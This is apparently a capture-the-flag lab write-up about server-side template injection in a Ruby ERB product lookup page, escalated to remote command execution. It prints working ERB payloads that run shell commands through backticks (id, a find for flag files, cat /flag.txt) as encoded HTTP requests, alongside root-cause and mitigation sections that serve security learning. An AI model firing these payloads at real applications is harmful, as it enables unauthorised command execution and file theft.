---
title: "MooKoo — Server-Side Template Injection to RCE | Mookoo"
date: 2026-06-15 10:15:00 +0530
categories: [A05 - Injection, SSTI]
tags: [webverse-pro, ctf, ssti, rce, ruby, erb, command-execution]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/mookoo-ssti-rce.webp
  alt: MooKoo Server-Side Template Injection to RCE
---

## Lab Link

Lab: [MooKoo](https://dashboard.webverselabs-pro.com/mystery-challenges/mookoo)

---

## Overview

MooKoo was a shop-style WebVerse Pro lab where the product lookup functionality accepted a user-controlled `product` query parameter. Initial testing showed reflected input inside the product-not-found template, but further payload testing confirmed that the backend evaluated ERB-style template syntax.

The vulnerability chain was:

```text
User-controlled product parameter
        ↓
Server-side template evaluation
        ↓
ERB-style expression execution
        ↓
Ruby backtick command execution
        ↓
Remote command execution
        ↓
Flag file discovery and read
```

---

## Objective

The objective of the lab was to gain code execution through the vulnerable application behavior and retrieve the challenge flag.

---

## Vulnerability Identification

```text
OWASP Top 10:2025
└── A05: Injection
    └── Server-Side Template Injection
        └── ERB-style expression evaluation
            └── Remote Command Execution
```

The vulnerable behavior was found in:

```http
GET /product?product=<payload> HTTP/2
Host: <LAB_HOST>
```

At first, common template probes such as Jinja-style syntax did not execute. The input appeared in the “not found” message as plain text, which suggested reflection but not execution at that point.

Example observation:

{% raw %}
```text
{{7*7}} not found
```
{% endraw %}

If the payload had executed, the expected result would have been:

```text
49 not found
```

This meant the sink needed more syntax testing before confirming SSTI.

---

## Reconnaissance

The application exposed a product lookup route:

```http
GET /product?product=<product-name> HTTP/2
Host: <LAB_HOST>
```

When an unknown product was requested, the application returned a custom “Not found” page and reflected the supplied product value inside the page body.

This reflection was useful because it gave a visible testing point for template payloads.

---

## Exploitation

### 1. Testing Template Syntax

An initial ERB/EJS-style payload caused a bad request because the percent encoding was malformed:

```http
GET /product?product=%3C%=7*7%%3E HTTP/2
Host: <LAB_HOST>
```

The issue was the raw `%` character in the URL. A literal percent sign must be encoded as `%25`.

The corrected payload was:

```http
GET /product?product=%3C%25%3D7*7%25%3E HTTP/2
Host: <LAB_HOST>
```

Decoded payload:

{% raw %}
```erb
<%=7*7%>
```
{% endraw %}

The server response confirmed execution:

```html
<p class="notice">49 not found</p>
```

This confirmed server-side template injection using ERB-style syntax.

---

### 2. Confirming Command Execution

After confirming expression evaluation, the next step was to determine whether Ruby command execution was possible through template evaluation.

Payload:

{% raw %}
```erb
<%= `id` %>
```
{% endraw %}

URL-encoded request:

```http
GET /product?product=%3C%25%3D%20%60id%60%20%25%3E HTTP/2
Host: <LAB_HOST>
```

The response returned the current process user:

```text
uid=1100(farmhand) gid=999(farm) groups=999(farm)
```

This confirmed that the SSTI vulnerability had escalated into remote command execution.

---

### 3. Locating the Flag File

With command execution confirmed, file discovery was performed inside the lab environment.

Payload:

{% raw %}
```erb
<%= `find / -iname "*flag*" 2>/dev/null` %>
```
{% endraw %}

URL-encoded request:

```http
GET /product?product=%3C%25=%20%60find%20/%20-iname%20%22*flag*%22%202%3E/dev/null%60%20%25%3E HTTP/2
Host: <LAB_HOST>
```

The response showed several system paths and revealed the relevant challenge file:

```text
/flag.txt
```

---

### 4. Reading the Flag

The final step was to read the discovered flag file.

Payload:

{% raw %}
```erb
<%= `cat /flag.txt` %>
```
{% endraw %}

URL-encoded request:

```http
GET /product?product=%3C%25=%20%60cat%20/flag.txt%60%20%25%3E HTTP/2
Host: <LAB_HOST>
```

The response contained the challenge flag.

```text
WEBVERSE{REDACTED}
```

---

## Proof of Exploitation

The key proof points were:

{% raw %}
```text
<%=7*7%>       → 49
<%= `id` %>    → uid=1100(farmhand) gid=999(farm)
find command   → /flag.txt discovered
cat /flag.txt  → flag returned
```
{% endraw %}

This proved that the product parameter was not only reflected, but evaluated as part of a server-side template context.

---

## Root Cause Analysis

The root cause was unsafe handling of user-controlled input inside a server-side template.

Instead of treating the `product` parameter as plain data, the application allowed the input to become part of executable template code. In an ERB-style template environment, this allowed expressions such as:

{% raw %}
```erb
<%=7*7%>
```
{% endraw %}

to be evaluated by the server.

Because Ruby backticks execute shell commands, the template injection also enabled operating system command execution:

```erb
<%= `id` %>
```

---

## Impact

The impact was critical because the vulnerability allowed:

- Server-side code execution
- Operating system command execution
- File system enumeration
- Sensitive file disclosure
- Full compromise of the application runtime context

In this lab, the issue allowed reading `/flag.txt`.

In a real-world environment, the same class of bug could expose environment variables, application secrets, database credentials, cloud metadata, source code, private keys, or customer data.

---

## Mitigation

To prevent this vulnerability:

- Never concatenate user input into server-side template source.
- Treat user-controlled values as data, not executable template code.
- Use safe template rendering APIs that escape output by default.
- Avoid dynamic template compilation from request parameters.
- Validate product identifiers against an allowlist or database lookup.
- Run the application with least-privilege OS permissions.
- Disable dangerous template features where possible.
- Add security tests for SSTI payloads during development and CI.
- Monitor suspicious payloads such as `<%=`, `${`, `{{`, and command-substitution patterns.

---

## Lessons Learned

This lab was a good reminder that reflection alone does not always mean SSTI. The first payload only showed that the input appeared in the response. The vulnerability became clear only after testing the correct template syntax.

The important pivot was moving from generic SSTI probes to ERB-style syntax:

```erb
<%=7*7%>
```

Once that returned `49`, the rest of the path followed naturally:

```text
SSTI confirmation → command execution → file discovery → flag read
```

MooKoo demonstrates how a small product lookup feature can become a critical server-side compromise when user input is evaluated inside a template engine.
